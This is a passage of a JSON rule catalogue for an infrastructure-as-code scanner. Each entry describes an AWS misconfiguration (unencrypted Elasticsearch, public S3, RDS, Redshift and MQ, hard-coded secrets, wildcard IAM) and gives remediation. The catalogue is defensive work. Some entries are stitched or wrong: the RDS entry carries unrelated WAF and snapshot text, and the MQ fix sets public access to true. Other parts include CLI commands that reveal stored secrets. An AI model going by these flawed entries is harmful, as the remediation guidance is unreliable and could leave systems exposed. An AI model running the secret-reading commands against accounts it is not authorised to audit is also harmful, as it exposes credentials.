        "description": "AWS Elasticsearch domain encryption for data at rest is disabled\nDescription\nEncryption of data at rest is a security feature that helps prevent unauthorized access to your data. The feature uses AWS Key Management Service (AWS KMS) to store and manage your encryption keys and the Advanced Encryption Standard algorithm with 256-bit keys (AES-256) to perform the encryption. If enabled, the feature encrypts the domain's: indices, logs, swap files, all data in the application directory, and automated snapshots.\nWe recommend you implement encryption at rest in order to protect a data store containing sensitive information from unauthorized access, and fulfill compliance requirements.\nFix - Runtime \nProcedure\nBy default, domains do not encrypt data at rest, and you cannot configure existing domains to use EncryptionAtRest.\nTo enable EncryptionAtRest, you must create a new domain and migrate Elasticsearch to that domain. You will also need, at minimum, read-only permissions to AWS KMS. \nTo create a new domain sign in to your AWS Console and select the Elasticsearch service (under Analytics), follow these steps:\n\nSelect Create a new domain.\nChange the default Encryption setting to enabled.\nContinue configuring your cluster.\n\nFix - Buildtime\nCloudFormation\nResource: AWS::Elasticsearch::Domain\nArgument: Properties.EncryptionAtRestOptions.Enabled\nYAMLResources:\n  ElasticsearchDomain:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      ...\n      EncryptionAtRestOptions:\n+       Enabled: True\n",
        "severity": "LOW"
    },
    "CKV_AWS_6": {
        "url": "https://docs.bridgecrew.io/docs/elasticsearch_5",
        "description": "AWS Elasticsearch does not have node-to-node encryption enabled\nDescription\nThe AWS Elasticsearch Service makes it possible to host sensitive workloads with node-to-node encryption by using Transport Layer Security (TLS) for all communications between instances in a cluster. \nUsing node-to-node encryption ensures that any data you send to your Amazon Elasticsearch Service domain over HTTPS, remains encrypted in-flight while it is being distributed and replicated between the nodes.\nFix - Runtime \nAWS Console\nTo enable the feature, you must create another domain and migrate your data.\nUsing the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/. \nNavigate to the Analytics section, select Elasticsearch Service.\nTo enable node-to-node encryption when you configure a new cluster, select Node-to-node encryption.\n\nFix - Buildtime\nCloudFormation\nResources: AWS::Elasticsearch::Domain\nArgument: Properties.NodeToNodeEncryptionOptions.Enabled\nYAMLResources:\n  ElasticsearchDomain:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      ...\n      NodeToNodeEncryptionOptions:\n+       Enabled: True\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_83": {
        "url": "https://docs.bridgecrew.io/docs/elasticsearch_6",
        "description": "AWS Elasticsearch domains do not have EnforceHTTPS enabled\nDescription\nAmazon Elasticsearch Service (Amazon ES) allows you to build applications without setting up and maintaining your own search celuster on Amazon EC2. Amazon ES allows you to configure your domains to require that all traffic be submitted over HTTPS. This ensures communications between your clients and your domain are encrypted. \nWe recommend you configure the minimum required TLS version to accept. This option is a useful additional security control to ensure your clients are not misconfigured. \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/. \nOpen the Amazon Elasticsearch console.\nOpen a domain.\nSelect Actions > Modify encryptions\nSelect Require HTTPS for all traffic to the domain.\nClick Submit.\n\nFix - Buildtime\nCloudFormation\nResource: AWS::Elasticsearch::Domain\nArgument: Properties.DomainEndpointOptions.EnforceHTTPS\nYAMLResources:\n  Resource0:\n    Type: 'AWS::Elasticsearch::Domain'\n    Properties:\n        ...\n      DomainEndpointOptions:\n+       EnforceHTTPS: True\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_53": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_19",
        "description": "S3 bucket has block public ACLS disabled\nDescription\nAmazon S3 buckets and objects are configured to be private. They are protected by default, with the option to use Access Control Lists (ACLs) and bucket policies to grant access to other AWS accounts and to anonymous public requests. The Block public access to buckets and objects granted through new access control lists (ACLs) option does not allow the use of new public bucket or object ACLs, ensuring  future PUT requests that include them will fail.\nThis setting helps protect against future attempts to use ACLs to make buckets or objects public. When an application tries to upload an object with a public ACL this setting will be blocked for public access.\nWe recommend you set S3 Bucket BlockPublicAcls to True.\nFix - Buildtime\nTerraform\nResource: aws_s3_bucket_public_access_block\nArgument: block_public_acls   \naws_s3_bucket_public_access_block.artifacts.tfresource \"aws_s3_bucket_public_access_block\" \"artifacts\" {\n  count  = var.bucketname == \"\" ? 1 : 0\n  bucket = aws_s3_bucket.artifacts[0].id\n  \n+ block_public_acls   = true\n  block_public_policy = true\n  restrict_public_buckets = true\n  ignore_public_acls=true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_54": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_20",
        "description": "S3 bucket BlockPublicPolicy is not set to True\nDescription\nAmazon S3 Block Public Access policy works at the account level and on individual buckets, including those created in the future. It provides the ability to block existing public access, whether specified by an ACL or a policy, and ensures public access is not granted to newly created items. \nIf an AWS account is used to host a data lake or another business application, blocking public access will serve as an account-level guard against accidental public exposure.\nFix - Buildtime\nTerraform\nResource: aws_s3_bucket_public_access_block\nArgument: block_public_policy\naws_s3_bucket_public_access_block.artifacts.tfresource \"aws_s3_bucket_public_access_block\" \"artifacts\" {\n  count  = var.bucketname == \"\" ? 1 : 0\n  bucket = aws_s3_bucket.artifacts[0].id\n  \n  block_public_acls   = true\n+ block_public_policy = true\n  restrict_public_buckets = true\n  ignore_public_acls=true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_55": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_21",
        "description": "S3 bucket IgnorePublicAcls is not set to True\nDescription\nThe IgnorePublicAcls setting causes S3 to ignore all public ACLs on a bucket and any objects that it contains.  Enabling this setting does not affect the persistence of any existing ACLs and does not prevent new public ACLs from being set.\nThis setting will block public access granted by ACLs while still allowing PUT Object calls that include a public ACL.\nFix - Buildtime\nTerraform\n\nResource: aws_s3_bucket_public_access_block\nArgument: ignore_public_acls\n\naws_s3_bucket_public_access_block.artifacts.tfresource \"aws_s3_bucket_public_access_block\" \"artifacts\" {\n  ...\n  restrict_public_buckets = true\n+ ignore_public_acls=true\n}\n\nCloudFormation\n\nResource: AWS::S3::Bucket\nArgument: Properties.PublicAccessBlockConfiguration.IgnorePublicAcls\n\nYAMLType: 'AWS::S3::Bucket'\n    Properties:\n    ...\n    PublicAccessBlockConfiguration:\n        ...\n+       IgnorePublicAcls: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_56": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_22",
        "description": "S3 bucket RestrictPublicBucket is not set to True\nDescription\nThe S3 Block Public Access configuration enables specifying whether S3 should restrict public bucket policies for buckets in this account. Setting  RestrictPublicBucket to TRUE restricts access to buckets with public policies to only AWS services and authorized users within this account.\nEnabling this setting does not affect previously stored bucket policies.  Public and cross-account access within any public bucket policy, including non-public delegation to specific accounts, is blocked.\nFix - Buildtime\nTerraform\n\nResource: aws_s3_bucket_public_access_block\nArgument: restrict_public_buckets \n\naws_s3_bucket_public_access_block.artifacts.tfresource \"aws_s3_bucket_public_access_block\" \"artifacts\" {\n  ...\n+ restrict_public_buckets = true\n}\n\nCloudFormation\n\nResource: AWS::S3::Bucket\nArgument: Properties.PublicAccessBlockConfiguration.RestrictPublicBuckets\n\nYAMLType: 'AWS::S3::Bucket'\n    Properties:\n      ...\n      PublicAccessBlockConfiguration:\n        ...\n+       RestrictPublicBuckets: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_70": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_23",
        "description": "S3 bucket allows an action with any Principal\nDescription\nThe Principal element specifies the user, account, service, or other entity that is allowed or denied access to a resource. In Amazon S3, a Principal is the account or user who is allowed access to the actions and resources in the statement. When added to a bucket policy, the principal is the user, account, service, or other entity that is the recipient of this permission. \nWhen you set the wildcard (\"*\") as the Principal value you essentially grant permission to everyone. This is referred to as anonymous access. The following statements are all considered Anonymous Permissions.\nShell## Example 1\n\"Principal\":\"*\"\n\n## Example 2\n\"Principal\":{\"AWS\":\"*\"}\n\n## Example 2\n\"Principal\":{\"AWS\":[\"*\", ...]}\n\nWhen you grant anonymous access, anyone in the world can access your bucket. It is highly recommend to never grant any kind of anonymous write access to your S3 bucket.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/. \nOpen the Amazon S3 console.\nSelect the Permissions tab, then select Bucket Policy. \nRemove policies for s3:List actions for principals ''. If necessary, modify the policy instead, to limit the access to specific principals.\n\nFix - Buildtime \nTerraform\nGoresource \"aws_s3_bucket\" \"bucket\" {\n  bucket = \"bucket\"\n\n  policy = <<POLICY\n{\n    \"Id\": \"Policy1597273448050\",\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Action\": [\n                \"s3:GetObject\"\n            ],\n            \"Effect\": \"Allow\",\n            \"Resource\": \"arn:aws:s3:::bucket/*\",\n-           \"Principal\": \"*\"\n        },\n     ...\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_46": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_secrets_1",
        "description": "EC2 user data exposes secrets\nDescription\nUser Data is a metadata field of an EC2 instance that allows custom code to run after the instance is launched. It contains code exposed to any entity which has the most basic access to EC2, even read-only configurations. This code is not encrypted.\nRemoving secrets from easily-accessed unencrypted places reduces the risk of passwords, private keys and more from being exposed to third parties.\nFix - Runtime \nCLI Command\nTo see the secret, run the following CLI command:\nBashaws ec2 describe-instance-attribute \n--attribute userData \n--region <REGION> \n--instance-id <INSTANCE_ID> \n--query UserData.Value \n--output text > encodeddata; base64 \n--decode encodeddata\n\nFix - Buildtime\nTerraform\nResource: aws_instance\nArgument: user_data\nIn this case, the analysis has found a likely AWS secret being used in your user_data. Remove these secrets, substitute with dynamic (i.e. Obtain from Vault) or use instance profiles.\naws_instance.web.tfresource \"aws_instance\" \"web\" {\n    ...\n    instance_type = \"t3.micro\"\n-    user_data = \"access_key=123456ABCDEFGHIJZTLA and secret_key=AAAaa+Aa4AAaAA6aAkA0Ad+Aa8aA1aaaAAAaAaA\"\n}\n\nCloudFormation\nResource: AWS::EC2::Instance\nArgument: Properties.UserData\nYAMLResources:\n  Instance:\n    Type: AWS::EC2::Instance\n    Properties:\n      ...\n-     UserData: \"...\"\n",
        "severity": "HIGH"
    },
    "CKV_AWS_45": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_secrets_3",
        "description": "Lambda function's environment variables expose secrets\nDescription\nA function's metadata includes environment variable fields that contain small configurations that help the function execute. These variables can be accessed by any entity with the most basic read-metadata-only permissions, and cannot be encrypted. Lambda runtime makes environment variables available without passing secrets in code or environment variables. \nWe recommend you remove secrets from unencrypted places, especially if they can be easily accessed, to reduce the risk of exposing data to third parties.\nFix - Runtime \nCLI Command\nTo see the secrets, run the following CLI command:\nShellaws lambda get-function-configuration \n--region <REGION> \n--function-name <FUNCTION_NAME> \n--query Environment.Variables\n\nFix - Buildtime \nCloudFormation\n\nResource: AWS::Lambda::Function\nArgument: Properties.Environment.Variables\n\nYAMLType: AWS::Lambda::Function\n    Properties:\n        ...\n        Environment:\n            Variables:\n                key1: not_a_secret\n-           key2: secret\n\nFix - Buildtime\nTerraform\n\nResource: aws_lambda_function\nArgument Block Environment Attribute variables\n\naws_lambda_function.fail.tfresource \"aws_lambda_function\" \"fail\" {\n  function_name = \"test-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n\n  environment {\n    variables = {\n-      AWS_ACCESS_KEY_ID     = \"AKIAIOSFODNN7EXAMPLE\",\n-      AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n-      AWS_DEFAULT_REGION    = \"us-west-2\"\n     }\n  }\n}\n\nIn this case the permissions would be better being added to an IAM Role.",
        "severity": "HIGH"
    },
    "CKV_AWS_41": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_secrets_5",
        "description": "AWS access keys and secrets are hard coded in infrastructure\nDescription\nWhen accessing AWS programmatically users can select to use an access key to verify their identity, and the identity of their applications. An access key consists of an access key ID and a secret access key. Anyone with an access key has the same level of access to AWS resources. \nWe recommend you protect access keys and keep them private. Specifically, do not store hard coded keys and secrets in infrastructure such as code, or other version-controlled configuration settings.\nFix - Buildtime\nTerraform\nYou really should not add your secrets to your Infrastructure code, obtain AWS through the keychain e.g. via Environmental variables.\nRemove any reference to access_key and secret_key.\nprovider.aws.tfprovider \"aws\" {\n  region = var.region\n  - access_key = \"NOTEXACTLYAKEY\"\n  - secret_key = \"NOTACTUALLYASECRET\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_32": {
        "url": "https://docs.bridgecrew.io/docs/public_1-ecr-repositories-not-public",
        "description": "AWS Private ECR repository policy is overly permissive\nDescription\nAWS ECR is a managed Docker registry service that simplifies Docker container image management. The ECR repository is a collection of Docker images available on AWS. Access control to ECR repositories is governed using resource-based policies. A public ECR repository can expose internal Docker images that contain confidential business logic. \nWe recommend you do not allow unrestricted public access to ECR repositories to help avoid data leakage. \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon ECS console.\nSelect Amazon ECR , then select Repositories.\nClick the image repository that you want to configure. To modify the permission policy, select Permissions.\nIn the Permission statements, select the policy statement that has Effect set to Allow and Principal set to *.\nTo select a restricted access policy, click Edit and make changes.\n\nFix - Buildtime \nCloudFormation\nResource: AWS::ECR::Repository\nArgument: Properties.RepositoryPolicyText.Statement.Principal\nYAMLResources: \n  MyRepository: \n    Type: AWS::ECR::Repository\n    Properties: \n      ...\n      RepositoryPolicyText: \n        ...\n        Statement: \n          - ...\n-           Principal: \"*\"\n+                       Principal:\n+             AWS: \n+                - \"arn:aws:iam::123456789012:user/Bob\"\n+                - ...\n",
        "severity": "INFO"
    },
    "CKV_AWS_17": {
        "url": "https://docs.bridgecrew.io/docs/public_2",
        "description": "AWS RDS database instance is publicly accessible\nDescription\nEnsure that all your public AWS Application Load Balancer are integrated with the Web Application Firewall (AWS WAF) service to protect against application-layer attacks. An Application Load Balancer functions at the application layer, the seventh layer of the Open Systems Interconnection (OSI) model. After the load balancer receives a request, it evaluates the listener rules in priority order to determine which rule to apply, and then selects a target from the target group for the rule action. You can configure listener rules to route requests to different target groups based on the content of the application traffic. Routing is performed independently for each target group, even when a target is registered with multiple target groups.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon RDS console.\nOn the navigation pane, click Snapshots.\nSelect the snapshot to encrypt.\nNavigate to Snapshot Actions, select Copy Snapshot.\nSelect your Destination Region, then enter your New DB Snapshot Identifier.\nSet Enable Encryption to Yes.\nSelect your Master Key from the list, then select Copy Snapshot.\n\nFix - Buildtime\nTerraform\n\nResource: aws_db_instance\nArgument: publicly_accessible\n\naws_rds_cluster.default.tfresource \"aws_db_instance\" \"default\" {\n  ...\n+ publicly_accessible   = false\n}\n\nCloudFormation\n\nResource: AWS::RDS::DBInstance\nArgument: Properties.PubliclyAccessible\n\nYAMLType: 'AWS::RDS::DBInstance'\n    Properties:\n      ...\n+     PubliclyAccessible: false\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_59": {
        "url": "https://docs.bridgecrew.io/docs/public_6-api-gateway-authorizer-set",
        "description": "API gateway methods are publicly accessible\nDescription\nAWS API gateway methods are by default publicly accessible. All of the methods configured as part of the API should be protected by an Authorizer or an API key. Unprotected API's can lead to data leaks and security breaches.\nWe recommend you configure a custom authorizer OR an API key for every method in the API Gateway.\nFix - Buildtime\nCloudFormation\n\nResource:  AWS::ApiGateway::Method\nArgument: Properties.HttpMethod / Properties.AuthorizationType / Properties.ApiKeyRequired\n\nYAMLResources:\n  ProtectedExample1:\n    Type: 'AWS::ApiGateway::Method'\n    Properties:\n      ...\n+     HttpMethod: OPTIONS\n      AuthorizationType: NONE\n            ...\n      \n    ProtectedExample2:\n    Type: 'AWS::ApiGateway::Method'\n    Properties:\n      ...\n      HttpMethod: GET\n      AuthorizationType: NONE\n+     ApiKeyRequired: true\n            ...\n\n   ProtectedExample3:\n    Type: 'AWS::ApiGateway::Method'\n    Properties:\n      ...\n      HttpMethod: GET\n+     AuthorizationType: AWS_IAM # or other valid authorization types\n            ...\n\nTerraform\n\nResource:  aws_api_gateway_method\nArgument: http_method, authorisation, api_key_required \n\naws_api_gateway_method.pass.tfresource \"aws_api_gateway_method\" \"pass\" {\n  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n  resource_id = aws_api_gateway_resource.MyDemoResource.id\n + http_method = \"OPTIONS\"\n + authorization    = \"NONE\"\n + api_key_required = true\n  tags             = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_87": {
        "url": "https://docs.bridgecrew.io/docs/public_9",
        "description": "AWS Redshift clusters should not be publicly accessible\nDescription\nRedshift clusters deployed within a VPC can be accessed from: the Internet, EC2 Instances outside the VPC via VPN, bastion hosts that you can launch in your public subnet, and using Amazon Redshift\u2019s Publicly Accessible option. To use public connectivity, create your Redshift clusters with the Publicly Accessible option set to Yes, your Redshift clusters within a VPC will be fully accessible outside your VPC. If you do not want your Redshift clusters accessible from the Internet or outside your VPC, disable the Redshift Publicly Accessible option. If your AWS account allows you to create EC2-Classic clusters, the default option for Publicly Accessible is No.\nPublic access to a Redshift cluster can increase the opportunity for malicious activity such as SQL injections or Distributed Denial of Service (DDoS) attacks.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nNavigate to the Redshift service.\nClick on the identified Redshift cluster name.\nIn the menu options, click Cluster, then select Modify.\nEnsure the value for Publicly Accessible is set to No.\n\nFix - Buildtime\nTerraform\n\nResource: aws_redshift_cluster\nArgument: publicly_accessible\n\nGoresource \"aws_redshift_cluster\" \"default\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  ...\n- publicly_accessible= \"true\"\n+ publicly_accessible= \"false\"  \n}\n\nCloudFormation\n\nResource: AWS::Redshift::Cluster\nArgument: Properties.PubliclyAccessible\n\nYAMLType: \"AWS::Redshift::Cluster\"\n    Properties:\n      ...\n-     PubliclyAccessible: true\n+           PubliclyAccessible: false\n",
        "severity": "HIGH"
    },
    "CKV_AWS_77": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_29",
        "description": "Athena Database is not encrypted at rest\nDescription\nAthena is a query service managed by AWS that uses standard SQL to analyze data directly in Amazon S3. Encryption of data while in transit between Amazon Athena and S3 is provided by default using SSL/TLS, but encryption of query results at rest is not enabled by default. \nThe encryption at rest feature available for AWS Athena query results provides an additional layer of data protection by helping secure your data against unauthorized access to the underlying Amazon S3 storage.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/. \nOpen the Amazon Athena console.\nIn the Athena console, choose Settings.\nChoose Encrypt query results.\nFor Encryption select either CSE-KMS, SSE-KMS, or SSE-S3.\nIf your account has access to an existing AWS KMS customer managed key (CMK), choose its alias or choose Enter a KMS key ARN, then enter an ARN.\nClick Save.\n\nFix - Buildtime \nTerraform\n\nResource: aws_athena_database\nArguments:encryption_configuration - (Optional) The encryption key block AWS Athena uses to decrypt the data in S3, such as an AWS Key Management Service (AWS KMS) key. An encryption_configuration block is documented below. \n\nGoresource \"aws_athena_database\" \"examplea\" {\n  ...\n  name   = \"database_name\"\n+ encryption_configuration {\n+   encryption_option = var.encryption_option\n+   kms_key           = var.kms_key_arn\n+ }\n  ...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_62": {
        "url": "https://docs.bridgecrew.io/docs/iam_47",
        "description": "AWS IAM policy allows full administrative privileges \nDescription\nIAM policies should grant a minimum set of permissions, adding more as required, rather than grant full administrative privileges. Providing full administrative privileges when not required exposes resources to potentially unwanted actions.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon IAM console.\nIn the navigation pane, click Policies and then search for the policy name found in the audit step.\nSelect the policy that needs to be deleted.\nIn the policy action menu, select first Detach.\nSelect all Users, Groups, Roles that have this policy attached.\nClick Detach Policy.\nIn the policy action menu, select Detach.\n\nCLI Command\n\nList all IAM users, groups, and roles that the specified managed policy is attached to:\n\naws iam list-entities-for-policy --policy-arn <policy_arn>\n\nDetach the policy from all IAM Users:\n\naws iam detach-user-policy --user-name <iam_user> --policy-arn <policy_arn>\n\nDetach the policy from all IAM Groups:\n\naws iam detach-group-policy --group-name <iam_group> --policy-arn <policy_arn>\n\nDetach the policy from all IAM Roles:\n\naws iam detach-role-policy --role-name <iam_role> --policy-arn <policy_arn>\nFix - Buildtime \nTerraform\n\nResources: aws_iam_policy\nArgument: policy - (Required) The policy document. This is a JSON formatted string. For more information about building AWS IAM policy documents with Terraform, see the AWS IAM Policy Document Guide \n\nGoresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n-        \"*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_63": {
        "url": "https://docs.bridgecrew.io/docs/iam_48",
        "description": "IAM policy documents allow * (asterisk) as a statement's action\nDescription\nIAM policies should grant a minimum set of permissions, adding more as required, rather than grant full administrative privileges. Providing full administrative privileges when not required exposes resources to potentially unwanted actions.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon IAM console.\nIn the navigation pane, click Policies and then search for the policy name found in the audit step.\nSelect the policy that needs to be deleted.\nIn the policy action menu, select first Detach.\nSelect all Users, Groups, Roles that have this policy attached.\nClick Detach Policy.\nIn the policy action menu, select Detach.\n\nCLI Command\n\nList all IAM users, groups, and roles that the specified managed policy is attached to:\n\naws iam list-entities-for-policy --policy-arn <policy_arn>\n\nDetach the policy from all IAM Users:\n\naws iam detach-user-policy --user-name <iam_user> --policy-arn <policy_arn>\n\nDetach the policy from all IAM Groups:\n\naws iam detach-group-policy --group-name <iam_group> --policy-arn <policy_arn>\n\nDetach the policy from all IAM Roles:\n\naws iam detach-role-policy --role-name <iam_role> --policy-arn <policy_arn>\nFix - Buildtime \nTerraform\n\nResources: aws_iam_policy\nArgument: policy - (Required) The policy document. This is a JSON formatted string. For more information about building AWS IAM policy documents with Terraform, see the AWS IAM Policy Document Guide. \n\nGoresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n-        \"*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_66": {
        "url": "https://docs.bridgecrew.io/docs/logging_13",
        "description": "CloudWatch log groups do not specify retention days\nDescription\nEnabling CloudWatch retention establishes how long log events are kept in AWS CloudWatch Logs. Retention settings are assigned to CloudWatch log groups and the retention period assigned to a log group is applied to their log streams. Any data older than the current retention setting is deleted automatically. You can change the log retention for each log group at any time.\nLog data is stored in CloudWatch Logs indefinitely by default, l. This may incur high unexpected costs, especially when combined with other forms of logging. We recommend you configure how long to store log data for in a log group to balance cost with compliance retention requirements. \nFix - Runtime \nAWS Console\nProcedure:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon CloudWatch console.\nIn the navigation pane, choose Log Groups.\nFind the log group to update.\nIn the Expire Events After column for that log group, choose the current retention setting, such as Never Expire.\nIn Edit Retention, for Retention, choose a log retention value, then click Ok.\n\nCLI Command\nSets the retention of the specified log group. A retention policy allows you to configure the number of days for which to retain log events in the specified log group.\nShellput-retention-policy\n--log-group-name <value>\n--retention-in-days <value>\n[--cli-input-json <value>]\n[--generate-cli-skeleton <value>]\n\nFix - Buildtime \nTerraform\n\nResource: aws_cloudwatch_log_group\nArgument: retention_in_days - (Optional) Specifies the number of days you want to retain log events in the specified log group. Possible values are: 1, 3, 5, 7, 14, 30, 60, 90, 120, 150, 180, 365, 400, 545, 731, 1827, 3653, and 0. If you select 0, the events in the log group are always retained and never expire. \n\nGoresource \"aws_cloudwatch_log_group\" \"example\" {\n  ...\n  name = \"example\"\n+ retention_in_days = 90\n}\n\nCloudFormation\n\nResource: aws_cloudwatch_log_group\nArgument: Properties.RetentionInDays - (Optional) Specifies the number of days you want to retain log events in the specified log group. Possible values are: 1, 3, 5, 7, 14, 30, 60, 90, 120, 150, 180, 365, 400, 545, 731, 1827, 3653, and 0. If you select 0, the events in the log group are always retained and never expire. \n\nYAMLResources: \n  logGroup:\n    Type: AWS::Logs::LogGroup\n    Properties: \n      ...\n+     RetentionInDays: 90\n",
        "severity": "LOW"
    },
    "CKV_AWS_68": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_27",
        "description": "CloudFront distribution does not have WAF enabled\nDescription\nAWS WAF gives you control over how traffic reaches your applications by enabling you to create security rules. We recommend you create rules that block common attack patterns, such as SQL injection, cross-site scripting, and rules that filter out specific traffic patterns that you have defined.\nWith AWS Cloudfront \u2013 WAF integration enabled you will be able to block any malicious requests made to your Cloudfront Content Delivery Network based on the criteria defined in the WAF Web Access Control List (ACL) associated with the CDN distribution.\nFix - Runtime \nCloudFront Console\n\nLog in to the CloudFront console at https://console.aws.amazon.com/cloudfront/.\nChoose the ID for the distribution that you want to update.\nOn the General tab, click Edit.\nOn the Distribution Settings page, in the AWS WAF Web ACL list, choose the web ACL that you want to associate with this distribution.\nIf you want to disassociate the distribution from all web ACLs, choose None. If you want to associate the distribution with a different web ACL, choose the new web ACL.\nClick Yes, Edit.\n\nFix - Buildtime \nTerraform\n\nResource: aws_cloudfront_distribution\nArguments: web_acl_id (Optional) - If you're using AWS WAF to filter CloudFront requests, the Id of the AWS WAF web ACL that is associated with the distribution. The WAF Web ACL must exist in the WAF Global (CloudFront) region and the credentials configuring this argument must have waf:GetWebACL permissions assigned. If using WAFv2, provide the ARN of the web ACL. \n\nGoresource \"aws_cloudfront_distribution\" \"exapmle\" {\n  ...\n  enabled             = true\n  is_ipv6_enabled     = false\n+ web_acl_id = aws_wafv2_web_acl.example.id\n  ...\n}\n\nCloudFormation\n\nResource: AWS::CloudFront::Distribution\nArguments:  Properties.DistributionConfig.WebACLId\n\nYAMLType: 'AWS::CloudFront::Distribution'\n    Properties:\n        ...\n      DistributionConfig:\n        ...\n        WebACLId: arn:aws:wafv2:us-east-1:123456789012:global/webacl/ExampleWebACL/12345\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_69": {
        "url": "https://docs.bridgecrew.io/docs/public_11",
        "description": "AWS MQ is publicly accessible\nDescription\nBrokers created without public accessibility cannot be accessed from outside of your VPC. This greatly reduces your broker's susceptibility to DDoS attacks from the internet. Public Amazon MQ brokers can be accessed directly, outside of a VPC, allowing every EC2 on the Internet to reach your brokers through their public endpoints. This can increase the opportunity for malicious activity such as cross-site scripting and clickjacking attacks.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon MQ console.\nIn the Select deployment and storage page, in the Deployment mode and storage type section configure your MQ based on your specs.\nIn the Network and security section, configure your broker's connectivity and select the Public accessibility of your broker. Disabling public accessibility makes the broker accessible only within your VPC. \n\nFix - Buildtime \nTerraform\n\nResource: aws_mq_broker\nArgument: publicly_accessible - (Optional) Whether to enable connections from applications outside of the VPC that hosts the broker's subnets. \n\nGoresource \"aws_mq_broker\" \"example\" {\n  broker_name = \"example\"\n+ publicly_accessible = true\n  configuration {\n    id       = aws_mq_configuration.test.id\n    revision = aws_mq_configuration.test.latest_revision\n  }\n\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  security_groups    = [aws_security_group.test.id]\n\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_73": {
        "url": "https://docs.bridgecrew.io/docs/logging_15",
        "description": "API Gateway does not have X-Ray tracing enabled\nDescription\nWhen an API Gateway stage has the active tracing feature enabled, Amazon API Gateway service automatically samples API invocation requests based on the sampling algorithm specified by AWS X-Ray.\nWith tracing enabled X-Ray can provide an end-to-end view of an entire HTTP request. You can use this to analyze latencies in APIs and their backend services.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon API Gateway console.\nIn the APIs pane, choose the API, and then click Stages.\nIn the Stages pane, choose the name of the stage.\nIn the Stage Editor pane, choose the Logs/Tracing tab.\nTo enable active X-Ray tracing, choose Enable X-Ray Tracing under X-Ray Tracing.\n\nCLI Command\nShellaws apigateway create-stage \\\n    --rest-api-id {rest-api-id} \\\n    --stage-name {stage-name} \\\n    --deployment-id {deployment-id} \\\n    --region {region} \\\n    --tracing-enabled=true\n\nFix - Buildtime \nTerraform\n\nResource: aws_api_gateway_stage\nArgument: xray_tracing_enabled - (Optional) Whether active tracing with X-ray is enabled. Defaults to false. \n\nGoresource \"aws_api_gateway_stage\" \"test\" {\n  ...\n  stage_name    = \"prod\"\n+ xray_tracing_enabled = true\n  ...\n}\n\nCloudFormation\n\nResource: AWS::ApiGateway::Stage\nArgument: Properties.TracingEnabled\n\nYAMLResources:\n  MyStage:\n    Type: AWS::ApiGateway::Stage\n    Properties:\n      ...\n+     TracingEnabled: 